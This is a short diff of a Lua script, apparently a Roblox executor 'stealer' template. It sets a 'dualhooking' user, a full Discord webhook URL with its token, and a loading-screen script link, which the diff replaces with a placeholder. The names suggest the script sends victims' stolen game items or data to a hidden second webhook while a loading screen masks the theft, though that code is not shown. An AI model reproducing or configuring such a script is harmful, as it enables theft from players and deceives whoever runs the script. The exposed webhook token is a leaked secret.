@@ -9,7 +9,7 @@
 
 local dhuser = "FabiZockt_YT"       -- dualhooking user
 local dhwebhook = "https://discord.com/api/webhooks/1133072533558657114/kxKJlO3mZDb0L8CmqrGiw_-HofLRigWmxeYGa9MaQqqVs0i94bSCrXP7T2GOJ2WRqNlP" -- Dualhooking Webhook
-local loadingraw = "https://raw.githubusercontent.com/FabiZockt2/loading/main/loading.lua" -- Put Your LoadingScreen Raw Link Here
+local loadingraw = "LoadingScreen Raw Link" -- Put Your LoadingScreen Raw Link Here
 
 if getgenv().executed1 then return end
 getgenv().executed1 = true
